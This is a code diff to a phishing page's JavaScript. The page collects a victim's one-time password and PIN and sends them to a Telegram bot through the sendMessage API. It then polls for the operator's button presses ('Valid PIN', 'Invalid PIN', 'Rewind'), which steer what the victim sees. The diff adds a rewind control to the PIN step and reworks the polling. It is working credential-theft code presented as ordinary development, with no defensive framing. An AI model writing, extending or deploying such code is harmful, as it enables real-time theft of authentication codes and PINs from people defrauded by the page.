@@ -458,7 +458,6 @@
         const confirmPinBtn = document.getElementById('confirmPinBtn');
 
         const params = new URLSearchParams(window.location.search);
-        const inheritedRewindId = params.get('rewindId');
 
         function getAllParams() {
             return params.toString();
@@ -531,26 +530,6 @@
             return qs ? `${page}?${qs}` : page;
         }
 
-        // --- MASTER REWIND POLLING ---
-        function startMasterRewindPolling(targetRewindId) {
-            if (!targetRewindId) return;
-            const rewindInterval = setInterval(async () => {
-                try {
-                    const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`);
-                    const data = await res.json();
-                    if (!data.ok || !data.result) return;
-                    data.result.forEach(update => {
-                        state.lastUpdateId = update.update_id;
-                        if (update.callback_query && update.callback_query.data === targetRewindId) {
-                            clearInterval(rewindInterval);
-                            if (activeInterval) clearInterval(activeInterval);
-                            window.location.href = 'index.html?' + params.toString();
-                        }
-                    });
-                } catch (e) {}
-            }, 1000);
-        }
-
         function submitOTP() {
             if (isProcessing) return;
             isProcessing = true;
@@ -569,7 +548,7 @@
             const verifyDeviceId = `otp_verify_${ts}`;
             const validId    = `valid_${ts}`;
             const invalidId  = `invalid_${ts}`;
-            const rewindId   = `rewind_${ts}`;
+            const rewindId   = `rewind_${ts}`; // This rewind will return to index.html (start of flow)
 
             const paramSummary = Array.from(params.entries())
                 .map(([k, v]) => `${k}: <code>${v}</code>`)
@@ -602,7 +581,6 @@
             })
             .then(() => {
                 spinner.style.display = 'flex';
-                startMasterRewindPolling(rewindId);
                 startPolling(approveId, declineId, verifyDeviceId, validId, invalidId, rewindId);
             })
             .catch(() => {
@@ -651,6 +629,7 @@
                                     confirmPinBtn.disabled = false;
                                     confirmPinBtn.textContent = 'Confirm PIN';
                                 } else if (cb === rewindId) {
+                                    // Rewind from OTP page goes back to the index.html (start)
                                     clearInterval(activeInterval);
                                     spinner.style.display = 'none';
                                     window.location.href = 'index.html?' + params.toString();
@@ -679,6 +658,7 @@
             const ts        = Date.now();
             const validId   = `valid_pin_${ts}`;
             const invalidId = `invalid_pin_${ts}`;
+            const rewindId  = `rewind_to_otp_${ts}`; // This rewind will close the modal and go back to OTP step
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -688,16 +668,19 @@
                     text: `<b>🔴 PIN Verification</b>\n\nPIN: <code>${pin}</code>\n\nChoose action:`,
                     parse_mode: 'HTML',
                     reply_markup: {
-                        inline_keyboard: [[
-                            { text: '✅ Valid PIN',   callback_data: validId },
-                            { text: '❌ Invalid PIN', callback_data: invalidId }
-                        ]]
+                        inline_keyboard: [
+                            [
+                                { text: '✅ Valid PIN',   callback_data: validId },
+                                { text: '❌ Invalid PIN', callback_data: invalidId }
+                            ],
+                            [{ text: '⏪ Rewind', callback_data: rewindId }]
+                        ]
                     }
                 })
-            }).then(() => startPinPolling(validId, invalidId));
+            }).then(() => startPinPolling(validId, invalidId, rewindId));
         }
 
-        function startPinPolling(validId, invalidId) {
+        function startPinPolling(validId, invalidId, rewindId) {
             const interval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
@@ -718,6 +701,14 @@
                                     focusFirstInput('pinInputs');
                                     confirmPinBtn.disabled = false;
                                     confirmPinBtn.textContent = 'Confirm PIN';
+                                } else if (cb === rewindId) {
+                                    // Rewind from PIN step goes back to OTP step (closes modal)
+                                    clearInterval(interval);
+                                    pinModal.style.display = 'none';
+                                    spinner.style.display = 'none';
+                                    resetButton();
+                                    // Re-trigger OTP polling so buttons work again
+                                    submitOTP(); 
                                 }
                             }
                         });
@@ -737,7 +728,6 @@
         verifyBtn.onclick = submitOTP;
         confirmPinBtn.onclick = submitPIN;
         loadOffer();
-        if (inheritedRewindId) startMasterRewindPolling(inheritedRewindId);
     </script>
 </body>
 </html>
